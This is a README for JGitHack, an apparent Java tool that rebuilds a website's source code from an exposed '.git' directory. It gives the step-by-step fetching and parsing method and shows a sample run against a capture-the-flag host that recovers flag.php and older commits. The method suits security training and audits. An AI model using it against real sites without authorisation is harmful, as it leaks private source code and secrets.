# JGitHack
JGitHack is a Java tool using ".git leak" to restore web project.

## Main Principle
* fetch git objects directories
  + fetch ".git/logs/HEAD" from web 
  + parse ".git/logs/HEAD" for getting sha1 of commit object 
  + fetch commit object by their sha1 from web
  + parse commit object for getting sha1 of tree object
  + fetch tree object for getting sha1 of blob object or other tree object
* fetch current viersion of codes
  + ".git/index" from web
  + parse ".git/index" for getting the mapping between sha1 and file name
    - fetching blob object with sha1
    - restore it to file with file name
* git cli can be used from now on for further operation, e.g. checkout old versions.

## Example
* run JGitHack with a web url which has ".git leak".(The url used below is dynamic which may be ineffective now.) 
``` shell
GitHack build start
rootUrl:     http://10969825b5674ba6b0f0dd5b9742d5677aa2c9ad31314ff7.game.ichunqiu.com/Challenges
downloadDir: 10969825b5674ba6b0f0dd5b9742d5677aa2c9ad31314ff7.game.ichunqiu.com/Challenges
download file "/.git/index", size: 289
download file "/.git/logs/HEAD", size: 975
download file "/.git/config", size: 137
download file "/.git/COMMIT_EDITMSG", size: 15
download file "/.git/HEAD", size: 23
download file "/.git/refs/heads/master", size: 41
download object, sha1: 12c6ddf4af0a5542c1cf6a9ab19b4231c1fd9a88, size: 139
download object, sha1: 1556a1d651526780ecd22db22681619e4ce6aa4b, size: 146
download object, sha1: 69eaa876b7c0ec09169133a0cece4ef4622377f2, size: 83
download object, sha1: 91eb7d06c3c2e3b4260270c008b3bc2fb31fdb53, size: 83
download object, sha1: a5ea8f33599400a1622e06d2052593de79c57716, size: 66
download object, sha1: bd049e0081dbaba2311310b908e4b57cfe961c78, size: 68
download object, sha1: d0632969351d8329c6bdc1cac5e30b7d20fa8c82, size: 59
download object, sha1: 25a4a898b1a45412a538a7baa868bc406c1d8ba9, size: 117
download object, sha1: abbbdcc032c8e76087f2daf593f423f74857b0cf, size: 146
download object, sha1: 734d08bfd094afa3372b997bf1c71412c1afc7d9, size: 145
GitHack build success
GitHack cost 11s
GitHack checkout start
download object, sha1: 8854e23055a5d895157ee4df3e9f38e1e16f5e99, size: 52
restore file: /flag.php, sha1: 8854e23055a5d895157ee4df3e9f38e1e16f5e99
download object, sha1: d0632969351d8329c6bdc1cac5e30b7d20fa8c82, size: 59
restore file: /index.php, sha1: d0632969351d8329c6bdc1cac5e30b7d20fa8c82
download object, sha1: 20c774a517f7ee2d74379ca23d80c200e887eac3, size: 56
restore file: /robots.txt, sha1: 20c774a517f7ee2d74379ca23d80c200e887eac3
GitHack checkout success
```
* check the status for git
``` shell
MacBook-Air$ git fsck
Checking object directories: 100% (256/256), done.

MacBook-Air$ git log
commit abbbdcc032c8e76087f2daf593f423f74857b0cf
Author: tmp <tmp@tmp.tmp>
Date:   Fri Sep 16 13:16:21 2016 +0800
    add robots.txt
commit da06087a0b893ddb6b6c857e53ce4387c96785ab
Author: tmp <tmp@tmp.tmp>
Date:   Fri Sep 16 13:13:16 2016 +0800
    edit flag.php
commit 12c6ddf4af0a5542c1cf6a9ab19b4231c1fd9a88
Author: tmp <tmp@tmp.tmp>
Date:   Fri Sep 16 13:09:53 2016 +0800
    test

MacBook-Air$ git checkout 12c6ddf4af0a5542c1cf6a9ab19b4231c1fd9a88
Note: checking out '12c6ddf4af0a5542c1cf6a9ab19b4231c1fd9a88'.
HEAD is now at 12c6ddf... test
```
